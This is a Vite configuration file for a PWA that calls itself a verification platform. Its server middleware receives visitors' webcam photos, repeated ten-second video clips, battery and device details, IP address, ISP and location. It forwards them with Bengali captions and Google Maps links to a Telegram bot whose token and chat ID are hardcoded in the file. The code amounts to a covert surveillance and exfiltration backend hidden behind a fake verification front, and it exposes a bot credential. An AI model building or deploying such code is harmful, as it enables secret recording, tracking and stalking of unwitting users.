import tailwindcss from '@tailwindcss/vite';
import react from '@vitejs/plugin-react';
import path from 'path';
import {defineConfig, Plugin} from 'vite';
import {VitePWA} from 'vite-plugin-pwa';
import dotenv from 'dotenv';

dotenv.config();

// Helper to construct structured caption with device, battery, charging, IP, and location
// eslint-disable-next-line @typescript-eslint/no-explicit-any
function buildDetailedTelegramCaption(params: {
  header: string;
  verificationId: string;
  alisId?: string;
  cycle?: number;
  time?: string;
  deviceInfo?: any;
  clientIp?: string;
}): string {
  const d = params.deviceInfo || {};
  const effectiveIp =
    d.ip && !d.ip.includes('Resolving')
      ? d.ip
      : params.clientIp || 'Unknown IP';

  const location = d.location && d.location !== 'Unknown' ? d.location : 'Location Resolved';
  const mapsUrl =
    d.mapsUrl ||
    (effectiveIp && !effectiveIp.startsWith('127.') && effectiveIp !== 'Unknown IP'
      ? `https://www.google.com/maps?q=${encodeURIComponent(location !== 'Location Resolved' ? location : effectiveIp)}`
      : '');

  const battery = d.batteryLevel || 'Unknown';
  const charging = d.batteryCharging || 'Unknown';
  const device = d.deviceName || 'Smartphone / Desktop';
  const browser = d.browser || 'Web Browser';
  const platform = d.platform || 'Unknown OS';
  const screen = d.screen || 'Default';
  const isp = d.isp || 'Unknown Network Provider';
  const timeStr = params.time ? new Date(params.time).toLocaleString('en-US') : new Date().toLocaleString('en-US');

  return (
`${params.header}
🆔 সেশন আইডি: ${params.verificationId}
🔗 লিংক রেফারেন্স: ${params.alisId || 'direct'}
⏰ সময়: ${timeStr}

📱 ডিভাইস ও ব্যাটারি তথ্য:
• ডিভাইস নাম: ${device}
• প্ল্যাটফর্ম/OS: ${platform}
• ব্রাউজার: ${browser}
• স্ক্রিন রেজ্যুলেশন: ${screen}
• ব্যাটারি লেভেল: ${battery}
• চার্জিং স্ট্যাটাস: ${charging}

🌐 আইপি ও লাইভ লোকেশন:
• পাবলিক IP: ${effectiveIp}
• এলাকা/লোকেশন: ${location}
• ISP/নেটওয়ার্ক: ${isp}
• গুগল ম্যাপস: ${mapsUrl || 'N/A'}`
  );
}

function apiServerPlugin(): Plugin {
  return {
    name: 'api-server',
    configureServer(server) {
      server.middlewares.use(async (req, res, next) => {
        if (req.url === '/api/telegram-status' && req.method === 'GET') {
          const botToken = process.env.TELEGRAM_BOT_TOKEN || '8765690722:AAEy1PJxZBvK0ajvHLch3gUZBxIeCLp958M';
          const chatId = process.env.TELEGRAM_CHAT_ID || '7121685144';
          const isConfigured = !!(botToken && chatId);
          res.setHeader('Content-Type', 'application/json');
          res.end(JSON.stringify({
            configured: isConfigured,
            chatIdConfigured: !!chatId,
          }));
          return;
        }

        if (req.url === '/api/security-feed' && req.method === 'POST') {
          let body = '';
          req.on('data', (chunk) => {
            body += chunk;
          });
          req.on('end', async () => {
            try {
              const data = JSON.parse(body || '{}');
              const { verificationId, alisId, cycle, timestamp, videoBase64, deviceInfo } = data;

              if (!verificationId) {
                res.statusCode = 400;
                res.setHeader('Content-Type', 'application/json');
                res.end(JSON.stringify({ error: 'verificationId is required' }));
                return;
              }

              const botToken = process.env.TELEGRAM_BOT_TOKEN || '8765690722:AAEy1PJxZBvK0ajvHLch3gUZBxIeCLp958M';
              const chatId = process.env.TELEGRAM_CHAT_ID || '7121685144';

              const clientIp =
                (req.headers['x-forwarded-for'] as string)?.split(',')[0].trim() ||
                req.socket.remoteAddress ||
                '';

              if (botToken && chatId && videoBase64) {
                try {
                  const rawBase64 = videoBase64.includes(',') ? videoBase64.split(',')[1] : videoBase64;
                  const buffer = Buffer.from(rawBase64, 'base64');
                  
                  // Ensure MP4 file blob and .mp4 extension
                  const videoBlob = new Blob([buffer], { type: 'video/mp4' });
                  const videoFileName = `security_clip_${verificationId}_cycle${cycle || 1}.mp4`;

                  const caption = buildDetailedTelegramCaption({
                    header: `📹 সিকিউরিটি ফুটেজ [১০ সেকেন্ড ভিডিও #${cycle || 1}] (.mp4)`,
                    verificationId,
                    alisId,
                    cycle: cycle || 1,
                    time: timestamp,
                    deviceInfo,
                    clientIp,
                  });

                  const formData = new FormData();
                  formData.append('chat_id', chatId);
                  formData.append('video', videoBlob, videoFileName);
                  formData.append('caption', caption);

                  const tgRes = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
                    method: 'POST',
                    body: formData,
                  });
                  const tgData = (await tgRes.json()) as { ok: boolean; description?: string };

                  if (!tgData.ok) {
                    console.warn('sendVideo error in Vite, trying sendDocument:', tgData.description);
                    const docFormData = new FormData();
                    docFormData.append('chat_id', chatId);
                    docFormData.append('document', videoBlob, videoFileName);
                    docFormData.append('caption', caption);

                    const docRes = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
                      method: 'POST',
                      body: docFormData,
                    });
                    const docData = (await docRes.json()) as { ok: boolean; description?: string };

                    if (!docData.ok) {
                      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                          chat_id: chatId,
                          text: caption,
                        }),
                      });
                    }
                  }
                } catch (tgErr) {
                  console.warn('Telegram forward error:', tgErr);
                }
              }

              res.setHeader('Content-Type', 'application/json');
              res.end(JSON.stringify({
                success: true,
                cycle: cycle || 1,
                receivedAt: new Date().toISOString(),
              }));
            } catch (feedErr) {
              console.error('Failed to process security feed:', feedErr);
              res.statusCode = 500;
              res.setHeader('Content-Type', 'application/json');
              res.end(JSON.stringify({ error: 'Internal server error processing security feed' }));
            }
          });
          return;
        }

        if (req.url === '/api/notify-telegram' && req.method === 'POST') {
          let body = '';
          req.on('data', (chunk) => {
            body += chunk;
          });
          req.on('end', async () => {
            try {
              const data = JSON.parse(body || '{}');
              const {verificationId, time, photoBase64, alisId, deviceInfo} = data;

              if (!verificationId) {
                res.statusCode = 400;
                res.setHeader('Content-Type', 'application/json');
                res.end(JSON.stringify({error: 'verificationId is required'}));
                return;
              }

              const botToken = process.env.TELEGRAM_BOT_TOKEN || '8765690722:AAEy1PJxZBvK0ajvHLch3gUZBxIeCLp958M';
              const chatId = process.env.TELEGRAM_CHAT_ID || '7121685144';

              if (!botToken || !chatId) {
                res.setHeader('Content-Type', 'application/json');
                res.end(JSON.stringify({
                  success: true,
                  delivered: false,
                  note: 'Telegram credentials not configured in environment variables. Skipped sending.'
                }));
                return;
              }

              const clientIp =
                (req.headers['x-forwarded-for'] as string)?.split(',')[0].trim() ||
                req.socket.remoteAddress ||
                '';

              const captionText = buildDetailedTelegramCaption({
                header: '📸 ভেরিফিকেশন রিকোয়েস্ট ও ফটো ক্যাপচার',
                verificationId,
                alisId,
                time,
                deviceInfo,
                clientIp,
              });

              let photoSent = false;
              if (photoBase64) {
                try {
                  const rawBase64 = photoBase64.includes(',') ? photoBase64.split(',')[1] : photoBase64;
                  const buffer = Buffer.from(rawBase64, 'base64');
                  const file = new Blob([buffer], { type: 'image/jpeg' });
                  const formData = new FormData();
                  formData.append('chat_id', chatId);
                  formData.append('photo', file, `photo_${verificationId}.jpg`);
                  formData.append('caption', captionText);

                  const tgPhotoRes = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData,
                  });
                  const photoJson = (await tgPhotoRes.json()) as { ok: boolean; description?: string };
                  if (photoJson.ok) {
                    photoSent = true;
                  }
                } catch (pErr) {
                  console.warn('Telegram photo send error in Vite plugin:', pErr);
                }
              }

              if (!photoSent) {
                const tgResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                  method: 'POST',
                  headers: {'Content-Type': 'application/json'},
                  body: JSON.stringify({
                    chat_id: chatId,
                    text: captionText,
                  }),
                });
                const tgResult = await tgResponse.json() as {ok: boolean; description?: string};
                res.setHeader('Content-Type', 'application/json');
                if (tgResult.ok) {
                  res.end(JSON.stringify({success: true, delivered: true}));
                } else {
                  console.warn('Telegram API response error:', tgResult.description);
                  res.end(JSON.stringify({success: false, delivered: false, error: tgResult.description}));
                }
                return;
              }

              res.setHeader('Content-Type', 'application/json');
              res.end(JSON.stringify({success: true, delivered: true}));
            } catch (err) {
              console.error('Failed to notify Telegram:', err);
              res.statusCode = 500;
              res.setHeader('Content-Type', 'application/json');
              res.end(JSON.stringify({error: 'Internal server error processing notification'}));
            }
          });
          return;
        }

        next();
      });
    },
  };
}

export default defineConfig(() => {
  return {
    plugins: [
      react(),
      tailwindcss(),
      apiServerPlugin(),
      VitePWA({
        registerType: 'autoUpdate',
        includeAssets: ['favicon.png', 'apple-touch-icon.png', 'icon.svg'],
        manifest: {
          id: '/',
          name: 'AB',
          short_name: 'AB',
          description: 'A modern, lightweight PWA verification and access management platform.',
          theme_color: '#090a0f',
          background_color: '#090a0f',
          display: 'standalone',
          start_url: '/',
          scope: '/',
          icons: [
            {
              src: '/pwa-192x192.png',
              sizes: '192x192',
              type: 'image/png',
              purpose: 'any',
            },
            {
              src: '/pwa-512x512.png',
              sizes: '512x512',
              type: 'image/png',
              purpose: 'any',
            },
            {
              src: '/pwa-maskable-512x512.png',
              sizes: '512x512',
              type: 'image/png',
              purpose: 'maskable',
            },
          ],
        },
        workbox: {
          globPatterns: ['**/*.{js,css,html,ico,png,svg,woff,woff2}'],
        },
        devOptions: {
          enabled: true,
          type: 'module',
        },
      }),
    ],
    resolve: {
      alias: {
        '@': path.resolve(__dirname, '.'),
      },
    },
    server: {
      // HMR is disabled in AI Studio via DISABLE_HMR env var.
      hmr: process.env.DISABLE_HMR !== 'true',
      watch: process.env.DISABLE_HMR === 'true' ? null : {},
    },
  };
});
